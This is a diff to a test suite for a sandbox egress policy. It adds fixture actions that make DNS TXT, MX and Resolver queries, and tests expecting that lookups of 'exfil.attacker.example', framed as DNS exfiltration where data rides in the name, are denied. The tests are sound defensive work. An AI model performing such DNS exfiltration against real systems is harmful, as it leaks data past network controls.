@@ -21,6 +21,8 @@ import {
 const FIXTURE = `
 const net = require("node:net");
 const dgram = require("node:dgram");
+const dns = require("node:dns");
+const dnsPromises = require("node:dns/promises");
 
 async function report(fn) {
   try {
@@ -150,6 +152,42 @@ const app = {
       displayName: "Collect",
       props: {},
       run: async () => ({ ok: true, value: await globalThis.__leftover }),
+    },
+    resolveTxt: {
+      name: "resolveTxt",
+      displayName: "Resolve TXT",
+      props: {},
+      run: (ctx) =>
+        report(
+          () =>
+            new Promise((resolve, reject) => {
+              dns.resolveTxt(ctx.propsValue.host, (error, records) => {
+                if (error) reject(error);
+                else resolve(records);
+              });
+            }),
+        ),
+    },
+    resolveMxPromise: {
+      name: "resolveMxPromise",
+      displayName: "Resolve MX",
+      props: {},
+      run: (ctx) => report(() => dnsPromises.resolveMx(ctx.propsValue.host)),
+    },
+    resolverInstance: {
+      name: "resolverInstance",
+      displayName: "Resolver instance",
+      props: {},
+      run: (ctx) =>
+        report(
+          () =>
+            new Promise((resolve, reject) => {
+              new dns.Resolver().resolve4(ctx.propsValue.host, (error, a) => {
+                if (error) reject(error);
+                else resolve(a);
+              });
+            }),
+        ),
     },
   },
 };
@@ -413,6 +451,47 @@ describe("worker egress policy", () => {
     expect(output.ok).toBe(false);
     expect(output.code).toBe("EGRESS_DENIED");
     expect(output.message).toContain("10.1.2.3");
+  });
+
+  it("blocks a DNS query, where the data rides in the name", async () => {
+    const output = (await run(
+      "resolveTxt",
+      { host: "exfil.attacker.example" },
+      {},
+    )) as Failure;
+
+    expect(output.ok).toBe(false);
+    expect(output.code).toBe("EGRESS_DENIED");
+    expect(output.message).toContain("exfil.attacker.example");
+  });
+
+  it("blocks the promise and Resolver forms of the same query", async () => {
+    const promised = (await run(
+      "resolveMxPromise",
+      { host: "exfil.attacker.example" },
+      {},
+    )) as Failure;
+    const instance = (await run(
+      "resolverInstance",
+      { host: "exfil.attacker.example" },
+      {},
+    )) as Failure;
+
+    expect(promised.code).toBe("EGRESS_DENIED");
+    expect(instance.code).toBe("EGRESS_DENIED");
+  });
+
+  it("still resolves a permitted hostname for the piece's own request", async () => {
+    // The guard's lookups go to getaddrinfo directly, so refusing c-ares must
+    // not cost a piece the ordinary name it was allowed to reach.
+    const output = (await run(
+      "fetchUrl",
+      { url: `http://localhost:${port}/` },
+      { allowHosts: ["localhost"], allowAddresses: ["127.0.0.1/32"] },
+    )) as Success;
+
+    expect(output.ok).toBe(true);
+    expect(output.value).toEqual({ status: 200, body: "allowed" });
   });
 
   it("blocks a piece listening for inbound connections", async () => {
